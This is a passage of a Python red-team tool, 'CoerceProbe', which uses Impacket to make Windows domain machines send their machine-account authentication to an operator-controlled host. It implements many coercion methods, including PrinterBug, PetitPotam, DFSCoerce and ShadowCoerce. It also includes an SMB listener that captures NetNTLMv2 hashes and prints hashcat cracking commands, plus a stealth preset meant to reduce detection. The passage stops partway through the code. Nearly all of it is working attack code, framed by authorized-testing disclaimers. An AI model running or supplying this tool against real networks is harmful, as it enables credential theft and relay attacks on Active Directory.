#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CoerceProbe — authentication-coercion validation for Windows/AD.

Author: kalraji007
Version: 1.0.0

WHAT THIS DOES
--------------
This tool triggers documented Windows RPC "coercion" primitives against one or
more targets. It does not exploit memory corruption, drop payloads, or modify
the target. It asks a Windows service to contact a listener you control; the
target then authenticates to that listener with its machine account.

It is a validation and red-team support tool, not an exploitation framework:
  * one or more targets, sequential methods
  * optional built-in SMB capture listener
  * listener preflight before sending traffic
  * optional delay/jitter and stop-on-first-result
  * no retries by default
  * no log tampering, AV/EDR evasion, persistence, or credential dumping

REQUIRES
--------
  python3 -m pip install impacket
  A listener you control (Responder, ntlmrelayx, or --listen)
  Written authorization for every target and the engagement.

QUICK START
-----------
  # List methods
  python3 coerceprobe.py --list-methods

  # One low-noise check with an external listener
  python3 coerceprobe.py \
      --target dc01.corp.local --target-ip 10.0.0.10 \
      --listener 10.0.0.50 --username alice --domain CORP \
      --method printer --stealth

  # Built-in SMB listener + coercion in one run
  python3 coerceprobe.py --target dc01.corp.local --listen \
      --username alice --domain CORP --method printer

  # Multiple targets from a file
  python3 coerceprobe.py --targets-file targets.txt \
      --listener 10.0.0.50 --username alice --domain CORP \
      --method printer,efsr-open,dfs-remove --stop-on-success

  # Dry run: show exactly what would be sent, without network traffic
  python3 coerceprobe.py --dry-run \
      --target dc01.corp.local --listener 10.0.0.50 \
      --username alice --domain CORP --method all

NOTES
-----
* "CALL_OK" or "LIKELY" does NOT prove the listener received authentication.
  It means the RPC call was accepted or failed in a way consistent with the
  target trying to reach your listener. Confirm on the listener side.
* "Without detection" cannot be guaranteed. Coercion creates RPC and
  authentication telemetry. The --stealth preset reduces volume and timing
  artifacts; it is not an invisibility cloak.
* Newer Windows (Windows 11 22H2+, Server 2025) use RPC over TCP for print
  by default. Use --transport tcp (CoerceProbe performs endpoint-mapper
  discovery) or a TCP-capable PrinterBug implementation for those targets.
"""

from __future__ import annotations

import argparse
import copy
import dataclasses
import getpass
import json
import random
import re
import secrets
import socket
import struct
import sys
import threading
import time
from datetime import datetime, timezone
from typing import Optional

try:
    from impacket import ntlm
    from impacket import smb3structs as smb2
    from impacket.dcerpc.v5 import epm, even, rprn, transport
    from impacket.dcerpc.v5.dtypes import DWORD, LONG, LPSTR, LPWSTR, NULL, ULONG, WSTR
    from impacket.dcerpc.v5.ndr import NDRCALL, NDRUNION
    from impacket.dcerpc.v5.rpcrt import (
        DCERPCException,
        RPC_C_AUTHN_LEVEL_CONNECT,
        RPC_C_AUTHN_LEVEL_PKT_INTEGRITY,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_AUTHN_WINNT,
    )
    from impacket.smbserver import SimpleSMBServer
    from impacket.spnego import (
        ASN1_AID,
        ASN1_SUPPORTED_MECH,
        SPNEGO_NegTokenInit,
        SPNEGO_NegTokenResp,
    )
    from impacket.uuid import uuidtup_to_bin
except ImportError as exc:  # pragma: no cover - user-facing dependency error
    sys.stderr.write(
        "[-] Impacket is required.\n"
        "    Install it with: python3 -m pip install impacket\n"
        f"    Import error: {exc}\n"
    )
    raise SystemExit(2)

__author__ = "kalraji007"
__version__ = "1.0.0"

DISCLAIMER = (
    "AUTHORIZED SECURITY TESTING ONLY. This tool forces authentication traffic "
    "and can trigger alerts or service disruption. You are solely responsible for "
    "obtaining written permission, staying within scope, and complying with all "
    "applicable laws. The author accepts no liability for misuse or damage."
)


# ---------------------------------------------------------------------------
# Impacket NDR call definitions for protocols that are not in current Impacket
# ---------------------------------------------------------------------------

class DCERPCSessionError(DCERPCException):
    """Generic session error so Impacket can raise a useful exception."""


class _EfsRpcOpenFileRaw(NDRCALL):
    opnum = 0
    structure = (("FileName", WSTR), ("Flags", LONG))


class _EfsRpcOpenFileRawResponse(NDRCALL):
    structure = ()


class _EfsRpcEncryptFileSrv(NDRCALL):
    opnum = 4
    structure = (("FileName", WSTR),)


class _EfsRpcEncryptFileSrvResponse(NDRCALL):
    structure = ()


class _EfsRpcDecryptFileSrv(NDRCALL):
    opnum = 5
    structure = (("FileName", WSTR), ("OpenFlag", ULONG))


class _EfsRpcDecryptFileSrvResponse(NDRCALL):
    structure = ()


class _EfsRpcQueryUsersOnFile(NDRCALL):
    opnum = 6
    structure = (("FileName", WSTR),)


class _EfsRpcQueryUsersOnFileResponse(NDRCALL):
    structure = ()


class _EfsRpcQueryRecoveryAgents(NDRCALL):
    opnum = 7
    structure = (("FileName", WSTR),)


class _EfsRpcQueryRecoveryAgentsResponse(NDRCALL):
    structure = ()


class _EfsRpcFileKeyInfo(NDRCALL):
    opnum = 12
    structure = (("FileName", WSTR), ("InfoClass", DWORD))


class _EfsRpcFileKeyInfoResponse(NDRCALL):
    structure = ()


class _NetrDfsAddStdRoot(NDRCALL):
    opnum = 12
    structure = (
        ("ServerName", WSTR),
        ("RootShare", WSTR),
        ("Comment", WSTR),
        ("ApiFlags", DWORD),
    )


class _NetrDfsAddStdRootResponse(NDRCALL):
    structure = ()


class _NetrDfsRemoveStdRoot(NDRCALL):
    opnum = 13
    structure = (
        ("ServerName", WSTR),
        ("RootShare", WSTR),
        ("ApiFlags", DWORD),
    )


class _NetrDfsRemoveStdRootResponse(NDRCALL):
    structure = ()


class _IsPathSupported(NDRCALL):
    opnum = 8
    structure = (("ShareName", WSTR),)


class _IsPathSupportedResponse(NDRCALL):
    structure = ()


class _IsPathShadowCopied(NDRCALL):
    opnum = 9
    structure = (("ShareName", WSTR),)


class _IsPathShadowCopiedResponse(NDRCALL):
    structure = ()


class _DNSSRV_RPC_UNION(NDRUNION):
    """MS-DNSP union; tag 3 = DNSSRV_TYPEID_LPWSTR."""

    commonHdr = (("tag", DWORD),)
    union = {3: ("WideString", LPWSTR)}


class _R_DnssrvOperation(NDRCALL):
    opnum = 0
    structure = (
        ("pwszServerName", LPWSTR),
        ("pszZone", LPSTR),
        ("dwContext", DWORD),
        ("pszOperation", LPSTR),
        ("dwTypeId", DWORD),
        ("pData", _DNSSRV_RPC_UNION),
    )


class _R_DnssrvOperationResponse(NDRCALL):
    structure = (("ErrorCode", DWORD),)


class _R_DhcpBackupDatabase(NDRCALL):
    opnum = 44
    structure = (("ServerIpAddress", DWORD), ("Path", LPWSTR))


class _R_DhcpBackupDatabaseResponse(NDRCALL):
    structure = (("ErrorCode", DWORD),)


class _R_DhcpRestoreDatabase(NDRCALL):
    opnum = 45
    structure = (("ServerIpAddress", DWORD), ("Path", LPWSTR))


class _R_DhcpRestoreDatabaseResponse(NDRCALL):
    structure = (("ErrorCode", DWORD),)


# ---------------------------------------------------------------------------
# Method catalogue
# ---------------------------------------------------------------------------

@dataclasses.dataclass(frozen=True)
class MethodSpec:
    name: str
    protocol: str
    pipe: str
    uuid: str
    version: str
    runner: str
    description: str
    transport: str = "smb"


METHODS: dict[str, MethodSpec] = {
    "printer": MethodSpec(
        name="printer",
        protocol="MS-RPRN",
        pipe=r"\PIPE\spoolss",
        uuid="12345678-1234-abcd-ef00-0123456789ab",
        version="1.0",
        runner="_run_printer",
        description="PrinterBug / SpoolSample; RpcRemoteFindFirstPrinterChangeNotificationEx (opnum 65)",
    ),
    "efsr-open": MethodSpec(
        name="efsr-open",
        protocol="MS-EFSR",
        pipe=r"\PIPE\lsarpc",
        uuid="c681d488-d850-11d0-8c52-00c04fd90f7e",
        version="1.0",
        runner="_run_efsr_open",
        description="PetitPotam classic; EfsRpcOpenFileRaw (opnum 0)",
    ),
    "efsr-encrypt": MethodSpec(
        name="efsr-encrypt",
        protocol="MS-EFSR",
        pipe=r"\PIPE\lsarpc",
        uuid="c681d488-d850-11d0-8c52-00c04fd90f7e",
        version="1.0",
        runner="_run_efsr_encrypt",
        description="EfsRpcEncryptFileSrv (opnum 4)",
    ),
    "efsr-decrypt": MethodSpec(
        name="efsr-decrypt",
        protocol="MS-EFSR",
        pipe=r"\PIPE\lsarpc",
        uuid="c681d488-d850-11d0-8c52-00c04fd90f7e",
        version="1.0",
        runner="_run_efsr_decrypt",
        description="EfsRpcDecryptFileSrv (opnum 5)",
    ),
    "efsr-query-users": MethodSpec(
        name="efsr-query-users",
        protocol="MS-EFSR",
        pipe=r"\PIPE\lsarpc",
        uuid="c681d488-d850-11d0-8c52-00c04fd90f7e",
        version="1.0",
        runner="_run_efsr_query_users",
        description="EfsRpcQueryUsersOnFile (opnum 6)",
    ),
    "efsr-query-recovery": MethodSpec(
        name="efsr-query-recovery",
        protocol="MS-EFSR",
        pipe=r"\PIPE\lsarpc",
        uuid="c681d488-d850-11d0-8c52-00c04fd90f7e",
        version="1.0",
        runner="_run_efsr_query_recovery",
        description="EfsRpcQueryRecoveryAgents (opnum 7)",
    ),
    "efsr-file-key": MethodSpec(
        name="efsr-file-key",
        protocol="MS-EFSR",
        pipe=r"\PIPE\lsarpc",
        uuid="c681d488-d850-11d0-8c52-00c04fd90f7e",
        version="1.0",
        runner="_run_efsr_file_key",
        description="EfsRpcFileKeyInfo (opnum 12)",
    ),
    "dfs-add": MethodSpec(
        name="dfs-add",
        protocol="MS-DFSNM",
        pipe=r"\PIPE\netdfs",
        uuid="4fc742e0-4a10-11cf-8273-00aa004ae673",
        version="3.0",
        runner="_run_dfs_add",
        description="DFSCoerce; NetrDfsAddStdRoot (opnum 12)",
    ),
    "dfs-remove": MethodSpec(
        name="dfs-remove",
        protocol="MS-DFSNM",
        pipe=r"\PIPE\netdfs",
        uuid="4fc742e0-4a10-11cf-8273-00aa004ae673",
        version="3.0",
        runner="_run_dfs_remove",
        description="DFSCoerce; NetrDfsRemoveStdRoot (opnum 13)",
    ),
    "shadow-supported": MethodSpec(
        name="shadow-supported",
        protocol="MS-FSRVP",
        pipe=r"\PIPE\FssagentRpc",
        uuid="a8e0653c-2744-4389-a61d-7373df8b2292",
        version="1.0",
        runner="_run_shadow_supported",
        description="ShadowCoerce; IsPathSupported (opnum 8)",
    ),
    "shadow-copied": MethodSpec(
        name="shadow-copied",
        protocol="MS-FSRVP",
        pipe=r"\PIPE\FssagentRpc",
        uuid="a8e0653c-2744-4389-a61d-7373df8b2292",
        version="1.0",
        runner="_run_shadow_copied",
        description="ShadowCoerce; IsPathShadowCopied (opnum 9)",
    ),
    "even": MethodSpec(
        name="even",
        protocol="MS-EVEN",
        pipe=r"\PIPE\eventlog",
        uuid="82273fdc-e32a-18c3-3f78-827929dc23ea",
        version="0.0",
        runner="_run_even",
        description="CheeseOunce; ElfrOpenBELW (opnum 9)",
    ),
    "dns-logpath": MethodSpec(
        name="dns-logpath",
        protocol="MS-DNSP",
        pipe="",
        uuid="50abc2a4-574d-40b3-9d66-ee4fd5fba076",
        version="5.0",
        runner="_run_dns_logpath",
        description="Less-common MS-DNSP coercion: R_DnssrvOperation / LogFilePath; requires DnsAdmins",
        transport="tcp",
    ),
    "dhcp-backup": MethodSpec(
        name="dhcp-backup",
        protocol="MS-DHCPM",
        pipe="",
        uuid="5b821720-f63b-11d0-aad2-00c04fc324db",
        version="1.0",
        runner="_run_dhcp_backup",
        description="Less-common MS-DHCPM coercion: R_DhcpBackupDatabase (opnum 44); requires DHCP Administrators",
        transport="tcp",
    ),
    "dhcp-restore": MethodSpec(
        name="dhcp-restore",
        protocol="MS-DHCPM",
        pipe="",
        uuid="5b821720-f63b-11d0-aad2-00c04fc324db",
        version="1.0",
        runner="_run_dhcp_restore",
        description="Less-common MS-DHCPM coercion: R_DhcpRestoreDatabase (opnum 45); requires DHCP Administrators",
        transport="tcp",
    ),
}

ALL_METHOD_ORDER = [
    "printer",
    "efsr-open",
    "efsr-encrypt",
    "efsr-decrypt",
    "efsr-query-users",
    "efsr-query-recovery",
    "efsr-file-key",
    "dfs-add",
    "dfs-remove",
    "shadow-supported",
    "shadow-copied",
    "even",
    "dns-logpath",
    "dhcp-backup",
    "dhcp-restore",
]

ALIASES = {
    "print": "printer",
    "spooler": "printer",
    "petitpotam": "efsr-open",
    "efsr": "efsr-open",
    "dfs": "dfs-remove",
    "shadow": "shadow-supported",
    "cheese": "even",
    "eventlog": "even",
    "dns": "dns-logpath",
    "dhcp": "dhcp-backup",
}

EFSR_ENDPOINTS = [
    (r"\PIPE\lsarpc", "c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
    (r"\PIPE\efsrpc", "df1941c5-fe89-4e79-bf10-463657acf44d", "1.0"),
]

AUTH_LEVELS = {
    "connect": RPC_C_AUTHN_LEVEL_CONNECT,
    "integrity": RPC_C_AUTHN_LEVEL_PKT_INTEGRITY,
    "privacy": RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
}

# RPC/Windows error codes that commonly mean "the call went out" rather than
# "the caller was rejected".  This is heuristic: always verify on the listener.
LIKELY_CODES = {
    0x35,  # ERROR_BAD_NETPATH
    0x43,  # ERROR_BAD_NET_NAME
    0x40,  # ERROR_NETNAME_DELETED
    0x3A,  # ERROR_BAD_NET_RESP
    0x3B,  # ERROR_UNEXP_NET_ERR
    0x6B,  # ERROR_BAD_NETPATH (legacy alias)
}
DENIED_CODES = {0x5, 0x522}  # ERROR_ACCESS_DENIED, ERROR_PRIVILEGE_NOT_HELD
UNREACHABLE_CODES = {
    0x4C9,  # ERROR_CONNECTION_REFUSED
    0x4CF,  # ERROR_NETWORK_UNREACHABLE
    0x4D0,  # ERROR_HOST_UNREACHABLE
    0x6BA,  # RPC_S_SERVER_UNAVAILABLE
    0x6BB,  # RPC_S_SERVER_TOO_BUSY
}
UNSUPPORTED_CODES = {
    0x31,  # ERROR_NOT_SUPPORTED
    0x32,  # ERROR_NOT_SUPPORTED (alt)
    0x6D,  # ERROR_INVALID_HANDLE / RPC_S_INVALID_BINDING
}
AMBIGUOUS_CODES = {
    0x57,  # ERROR_INVALID_PARAMETER (also used by some 0patch fixes)
    0x7B,  # ERROR_INVALID_NAME
}


# ---------------------------------------------------------------------------
# Results
# ---------------------------------------------------------------------------

@dataclasses.dataclass
class Result:
    method: str
    protocol: str
    target: str
    listener: str
    status: str
    detail: str
    error_code: Optional[int] = None
    elapsed: float = 0.0
    timestamp: str = ""

    def success_like(self) -> bool:
        return self.status in {"CALL_OK", "LIKELY", "AMBIGUOUS", "DRY_RUN"}

    def to_json(self) -> str:
        return json.dumps(dataclasses.asdict(self), sort_keys=True)


@dataclasses.dataclass(frozen=True)
class Target:
    host: str
    ip: Optional[str] = None


class SMBListener:
    """
    Small SMB2 listener built on Impacket's SMBSERVER.

    It captures the NTLM Type 3 (AUTHENTICATE) message and prints:
      user::domain:challenge:NTProofStr:blob
    which is the NetNTLMv2 format used by hashcat mode 5600.

    The listener is intentionally minimal: no shares, no relay, no credential
    validation. It exists so a single tool run can show the coerced
    authentication in front of the operator.
    """

    def __init__(
        self,
        address: str = "0.0.0.0",
        port: int = 445,
        json_output: bool = False,
        capture_log: Optional[str] = None,
    ):
        self.address = address
        self.port = port
        self.json_output = json_output
        self.capture_log = capture_log
        self.captures: list[dict] = []
        self._lock = threading.Lock()
        self._thread: Optional[threading.Thread] = None
        self._stopping = threading.Event()
        self._simple = SimpleSMBServer(listenAddress=address, listenPort=port)
        self._simple.setSMB2Support(True)
        self._simple.setNTLMSupport(True)
        self._simple.setSMBChallenge(secrets.token_hex(8))
        self._server = self._simple.getServer()
        self._orig_session_setup = self._server.hookSmb2Command(
            smb2.SMB2_SESSION_SETUP, self._on_session_setup
        )

    # -- lifecycle ---------------------------------------------------------

    def start(self) -> None:
        self._thread = threading.Thread(
            target=self._serve, name="coerceprobe-smb-listener", daemon=True
        )
        self._thread.start()

    def _serve(self) -> None:
        try:
            self._server.serve_forever(poll_interval=0.5)
        except Exception as exc:  # bind/serve errors are surfaced by the caller
            if not self._stopping.is_set():
                print(f"[!] SMB listener error: {exc}", file=sys.stderr)

    def stop(self) -> None:
        self._stopping.set()
        try:
            self._server.shutdown()
        except Exception:
            pass
        try:
            self._server.server_close()
        except Exception:
            pass

    def wait(self, seconds: float) -> None:
        if seconds > 0:
            time.sleep(seconds)

    # -- capture -----------------------------------------------------------

    def _on_session_setup(self, connId, smbServer, recvPacket):
        try:
            self._capture(connId, smbServer, recvPacket)
        except Exception:
            # Never break the SMB exchange because our parser did not like a packet.
            pass
        return self._orig_session_setup(connId, smbServer, recvPacket)

    def _capture(self, connId, smbServer, recvPacket) -> None:
        setup = smb2.SMB2SessionSetup(recvPacket["Data"])
        blob = setup["Buffer"]
        if not blob:
            return

        token = None
        if blob[0] == ASN1_AID:
            token = SPNEGO_NegTokenInit(blob)["MechToken"]
        elif blob[0] == ASN1_SUPPORTED_MECH:
            token = SPNEGO_NegTokenResp(blob)["ResponseToken"]
        elif blob.startswith(b"NTLMSSP\x00"):
            token = blob

        if not token or not token.startswith(b"NTLMSSP\x00"):
            return

        message_type = struct.unpack("<L", token[8:12])[0]
        if message_type != 3:
            return

        auth = ntlm.NTLMAuthChallengeResponse()
        auth.fromString(token)
        user = auth["user_name"].decode("utf-16le", "replace").rstrip("\x00")
        domain = auth["domain_name"].decode("utf-16le", "replace").rstrip("\x00")
        host = auth["host_name"].decode("utf-16le", "replace").rstrip("\x00")
        nt_response = auth["ntlm"]
        if not nt_response or len(nt_response) <= 16:
            return

        challenge = smbServer.getSMBChallenge()
        if isinstance(challenge, str):
            challenge = challenge.encode("latin-1", "replace")
        challenge_hex = challenge.hex()
        proof_hex = nt_response[:16].hex()
        blob_hex = nt_response[16:].hex()

        try:
            conn_data = smbServer.getConnectionData(connId, checkStatus=False)
            client_ip = conn_data.get("ClientIP", "?")
        except Exception:
            client_ip = "?"

        netntlm = f"{user}::{domain}:{challenge_hex}:{proof_hex}:{blob_hex}"
        capture = {
            "source": client_ip,
            "user": user,
            "domain": domain,
            "host": host,
            "challenge": challenge_hex,
            "netntlmv2": netntlm,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
        with self._lock:
            self.captures.append(capture)
            if self.capture_log:
                try:
                    with open(self.capture_log, "a", encoding="utf-8") as fh:
                        fh.write(netntlm + "\n")
                except OSError:
                    pass

        if self.json_output:
            print(
                json.dumps({"type": "smb_capture", **capture}, sort_keys=True),
                flush=True,
            )
        else:
            print(
                f"\n[+] SMB authentication from {client_ip}: "
                f"{domain}\\{user} (host: {host})",
                flush=True,
            )
            print(f"    NetNTLMv2: {netntlm}", flush=True)
            print("    hashcat -m 5600 <file> wordlist.txt", flush=True)


class CoerceProbe:
    def __init__(self, args: argparse.Namespace):
        self.args = args
        self.target = args.target.strip()
        self.target_ip = (args.target_ip or "").strip() or None
        self.listener = args.listener.strip()
        self.domain = (args.domain or "").strip()
        self.username = (args.username or "").strip()
        self.password = args.password or ""
        self.lmhash = ""
        self.nthash = ""
        if args.hashes:
            if ":" not in args.hashes:
                raise ValueError("--hashes must be LMHASH:NTHASH")
            self.lmhash, self.nthash = args.hashes.split(":", 1)

        self.transport = args.transport
        self._current_transport = "smb"
        self.rpc_port = args.rpc_port
        self.timeout = args.timeout
        self.auth_level = AUTH_LEVELS[args.auth_level]
        self.webdav = args.webdav
        self.webdav_port = args.webdav_port
        self.listener_port = self.webdav_port if self.webdav else args.listener_port
        self.randomize_unc = args.randomize_unc or args.stealth
        self.delay = args.delay
        self.jitter = args.jitter
        self.retries = args.retries
        self.stop_on_success = args.stop_on_success or args.stealth
        self.dry_run = args.dry_run
        self.quiet = args.quiet
        self.no_color = args.no_color or not sys.stdout.isatty()
        self.json_output = args.json
        self.debug = args.debug
        self.log_path = args.log
        self.engagement = args.engagement or ""

        if args.stealth:
            if self.delay == 0.0:
                self.delay = 4.0
            if self.jitter == 0.0:
                self.jitter = 3.0
            self.retries = 0

    # ------------------------- output helpers -------------------------

    def _c(self, text: str, color: str) -> str:
        if self.no_color:
            return text
        colors = {
            "red": "\033[31m",
            "green": "\033[32m",
            "yellow": "\033[33m",
            "blue": "\033[34m",
            "magenta": "\033[35m",
            "cyan": "\033[36m",
            "bold": "\033[1m",
            "reset": "\033[0m",
        }
        return f"{colors.get(color, '')}{text}{colors['reset']}"

    def _status_color(self, status: str) -> str:
        if status in {"CALL_OK", "LIKELY"}:
            return "green"
        if status == "AMBIGUOUS":
            return "yellow"
        if status in {"DENIED", "UNREACHABLE", "UNSUPPORTED"}:
            return "red"
        return "cyan"

    def _emit(self, result: Result) -> None:
        if self.json_output:
            print(result.to_json())
        else:
            status = self._c(f"{result.status:<11}", self._status_color(result.status))
            print(
                f"[{status}] {result.method:<18} {result.protocol:<9} "
                f"{result.detail}"
            )
        if self.log_path:
            record = dataclasses.asdict(result)
            record["engagement"] = self.engagement
            try:
                with open(self.log_path, "a", encoding="utf-8") as fh:
                    fh.write(json.dumps(record, sort_keys=True) + "\n")
            except OSError as exc:
                if not self.quiet:
                    print(f"[!] Could not write log: {exc}", file=sys.stderr)

    def _info(self, message: str) -> None:
        if not self.quiet and not self.json_output:
            print(message)

    # ------------------------- listener preflight -------------------------

    def _check_listener(self) -> None:
        if self.dry_run:
            return
        host = self.listener
        port = self.listener_port
        if self.args.no_listener_check:
            return
        try:
            with socket.create_connection((host, port), timeout=min(3.0, self.timeout)):
                pass
        except OSError as exc:
            print(
                f"[!] Listener {host}:{port} is not reachable ({exc}).\n"
                "    Aborting before generating blind authentication traffic.\n"
                "    Start Responder/ntlmrelayx or use --no-listener-check.",
                file=sys.stderr,
            )
            raise SystemExit(2)

    # ------------------------- RPC transport -------------------------

    def _resolve_tcp_port(self, uuid: str, version: str) -> int:
        if self.rpc_port:
            return self.rpc_port
        if self.args.no_epm:
            raise ValueError(
                "TCP transport needs --rpc-port when --no-epm is set"
            )
        binding = epm.hept_map(
            self.target,
            uuidtup_to_bin((uuid, version)),
            protocol="ncacn_ip_tcp",
        )
        match = re.search(r"\[(\d+)\]", binding)
        if not match:
            raise RuntimeError(f"endpoint mapper returned an unexpected binding: {binding}")
        return int(match.group(1))

    def _bind(self, pipe: str, uuid: str, version: str):
        mode = self.transport
        if mode == "auto":
            mode = self._current_transport
        if mode == "tcp":
            port = self._resolve_tcp_port(uuid, version)
            binding = r"ncacn_ip_tcp:%s[%d]" % (self.target, port)
        else:
            if not pipe:
                raise ValueError("SMB transport requested, but this method has no named pipe")
            binding = r"ncacn_np:%s[%s]" % (self.target, pipe)

        rpctransport = transport.DCERPCTransportFactory(binding)
        if hasattr(rpctransport, "set_connect_timeout"):
            rpctransport.set_connect_timeout(self.timeout)
        if hasattr(rpctransport, "set_credentials"):
            rpctransport.set_credentials(
                self.username,
                self.password,
                self.domain,
                self.lmhash,
                self.nthash,
            )
        if self.args.kerberos and hasattr(rpctransport, "set_kerberos"):
            rpctransport.set_kerberos(True, kdcHost=self.args.dc_ip)
        if self.target_ip and hasattr(rpctransport, "setRemoteHost"):
            rpctransport.setRemoteHost(self.target_ip)

        dce = rpctransport.get_dce_rpc()
        dce.set_auth_type(RPC_C_AUTHN_WINNT)
        dce.set_auth_level(self.auth_level)
        try:
            dce.get_rpc_transport().get_socket().settimeout(self.timeout)
        except Exception:
            pass
        dce.connect()
        dce.bind(uuidtup_to_bin((uuid, version)))
        return dce

    def _bind_efsr(self):
        last_error: Optional[Exception] = None
        for pipe, uuid, version in EFSR_ENDPOINTS:
            try:
                return self._bind(pipe, uuid, version)
            except Exception as exc:  # try the next EFSRPC endpoint
                last_error = exc
                if self.debug:
                    print(f"[d] EFSRPC bind failed on {pipe}: {exc}", file=sys.stderr)
        if last_error:
            raise last_error
        raise RuntimeError("No EFSRPC endpoint available")

    def _disconnect(self, dce) -> None:
        if dce is None:
            return
        try:
            dce.disconnect()
        except Exception:
            pass

    # ------------------------- path generation -------------------------

    def _token(self) -> str:
        if not self.randomize_unc:
            return "probe"
        return secrets.token_hex(4)

    def _unc_path(self, kind: str = "share") -> str:
        token = self._token()
        if self.webdav:
            if kind == "printer":
                return f"\\\\{self.listener}@{self.webdav_port}\\{token}\x00"
            if kind == "even":
                return f"\\??\\UNC\\{self.listener}\\{token}\\aa"
            if kind == "file":
                return f"\\\\{self.listener}@{self.webdav_port}\\{token}\\share\\file.txt\x00"
            return f"\\\\{self.listener}@{self.webdav_port}\\{token}\x00"

        if kind == "even":
            return f"\\??\\UNC\\{self.listener}\\{token}\\aa"
        if kind == "printer":
            return f"\\\\{self.listener}\x00"
        if kind == "file":
            return f"\\\\{self.listener}\\{token}\\share\\file.txt\x00"
        return f"\\\\{self.listener}\\{token}\x00"

    # ------------------------- error classification -------------------------

    @staticmethod
    def _extract_code(exc: Exception) -> Optional[int]:
        code = getattr(exc, "error_code", None)
        if isinstance(code, int):
            return code
        match = re.search(r"code:\s*0x([0-9a-fA-F]+)", str(exc))
        if match:
            try:
                return int(match.group(1), 16)
            except ValueError:
                return None
        return None

    def _make_result(
        self,
        spec: MethodSpec,
        status: str,
        detail: str,
        started: float,
        error_code: Optional[int] = None,
    ) -> Result:
        return Result(
            method=spec.name,
            protocol=spec.protocol,
            target=self.target,
            listener=self.listener,
            status=status,
            detail=detail,
            error_code=error_code,
            elapsed=round(time.monotonic() - started, 3),
            timestamp=datetime.now(timezone.utc).isoformat(),
        )

    def _result_from_exception(
        self, spec: MethodSpec, exc: Exception, started: float
    ) -> Result:
        code = self._extract_code(exc)
        text = str(exc).strip() or exc.__class__.__name__
        lower_text = text.lower()
        if code is None and any(
            marker in lower_text
            for marker in ("connection refused", "unreachable", "timed out", "no route to host")
        ):
            return self._make_result(
                spec,
                "UNREACHABLE",
                f"transport unavailable — {text}",
                started,
                None,
            )
        if code in LIKELY_CODES:
            status = "LIKELY"
            detail = (
                f"RPC error {code:#x} — consistent with the target reaching "
                f"the listener; verify on the listener"
            )
        elif code in DENIED_CODES:
            status = "DENIED"
            detail = f"access denied ({code:#x}) — caller lacks rights or RPC is blocked"
        elif code in UNREACHABLE_CODES:
            status = "UNREACHABLE"
            detail = f"transport unavailable ({code:#x}) — target or listener unreachable"
        elif code in UNSUPPORTED_CODES:
            status = "UNSUPPORTED"
            detail = f"interface/service unavailable ({code:#x})"
        elif code in AMBIGUOUS_CODES:
            status = "AMBIGUOUS"
            detail = (
                f"error {code:#x} — may be a blocked/patched path or a normal "
                f"post-callback failure; verify on the listener"
            )
        else:
            status = "ERROR"
            detail = text
        if self.debug and code is None:
            detail += f" | {text}"
        return self._make_result(spec, status, detail, started, code)

    # ------------------------- method implementations -------------------------

    def _run_printer(self, spec: MethodSpec) -> Result:
        started = time.monotonic()
        dce = None
        try:
            dce = self._bind(spec.pipe, spec.uuid, spec.version)
            resp = rprn.hRpcOpenPrinter(dce, "\\\\%s\x00" % self.target)
            request = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
            request["hPrinter"] = resp["pHandle"]
            request["fdwFlags"] = rprn.PRINTER_CHANGE_ADD_JOB
            request["pszLocalMachine"] = self._unc_path("printer")
            request["pOptions"] = NULL
            dce.request(request)
            return self._make_result(
                spec,
                "CALL_OK",
                "RPC call returned success; check the listener for machine-account auth",
                started,
            )
        except Exception as exc:
            return self._result_from_exception(spec, exc, started)
        finally:
            self._disconnect(dce)

    def _run_efsr_open(self, spec: MethodSpec) -> Result:
        started = time.monotonic()
        dce = None
        try:
            dce = self._bind_efsr()
            request = _EfsRpcOpenFileRaw()
            request["FileName"] = self._unc_path("file")
            request["Flags"] = 0
            dce.request(request)
            return self._make_result(spec, "CALL_OK", "RPC call returned success; verify listener", started)
        except Exception as exc:
            return self._result_from_exception(spec, exc, started)
        finally:
            self._disconnect(dce)

    def _run_efsr_encrypt(self, spec: MethodSpec) -> Result:
        started = time.monotonic()
        dce = None
        try:
            dce = self._bind_efsr()
            request = _EfsRpcEncryptFileSrv()
            request["FileName"] = self._unc_path("file")
            dce.request(request)
            return self._make_result(spec, "CALL_OK", "RPC call returned success; verify listener", started)
        except Exception as exc:
            return self._result_from_exception(spec, exc, started)
        finally:
            self._disconnect(dce)

    def _run_efsr_decrypt(self, spec: MethodSpec) -> Result:
        started = time.monotonic()
        dce = None
        try:
            dce = self._bind_efsr()
            request = _EfsRpcDecryptFileSrv()
            request["FileName"] = self._unc_path("file")
            request["OpenFlag"] = 0
            dce.request(request)
            return self._make_result(spec, "CALL_OK", "RPC call returned success; verify listener", started)
        except Exception as exc:
            return self._result_from_exception(spec, exc, started)
        finally:
            self._disconnect(dce)

    def _run_efsr_query_users(self, spec: MethodSpec) -> Result:
        started = time.monotonic()
        dce = None
        try:
            dce = self._bind_efsr()
            request = _EfsRpcQueryUsersOnFile()
            request["FileName"] = self._unc_path("file")
            dce.request(request)
            return self._make_result(spec, "CALL_OK", "RPC call returned success; verify listener", started)
        except Exception as exc:
            return self._result_from_exception(spec, exc, started)
        finally:
            self._disconnect(dce)

    def _run_efsr_query_recovery(self, spec: MethodSpec) -> Result:
        started = time.monotonic()
        dce = None
        try:
            dce = self._bind_efsr()
            request = _EfsRpcQueryRecoveryAgents()
            request["FileName"] = self._unc_path("file")
            dce.request(request)
            return self._make_result(spec, "CALL_OK", "RPC call returned success; verify listener", started)
        except Exception as exc:
            return self._result_from_exception(spec, exc, started)
        finally:
            self._disconnect(dce)

    def _run_efsr_file_key(self, spec: MethodSpec) -> Result:
        started = time.monotonic()
        dce = None
        try:
            dce = self._bind_efsr()
            request = _EfsRpcFileKeyInfo()
            request["FileName"] = self._unc_path("file")
            request["InfoClass"] = 0
            dce.request(request)
            return self._make_result(spec, "CALL_OK", "RPC call returned success; verify listener", started)
        except Exception as exc:
            return self._result_from_exception(spec, exc, started)
        finally:
            self._disconnect(dce)

    def _run_dfs_add(self, spec: MethodSpec) -> Result:
        started = time.monotonic()
        dce = None
        try:
            dce = self._bind(spec.pipe, spec.uuid, spec.version)
            request = _NetrDfsAddStdRoot()
            request["ServerName"] = self._unc_path("share")
            request["RootShare"] = "probe_" + self._token() + "\x00"
            request["Comment"] = "probe\x00"
            request["ApiFlags"] = 0
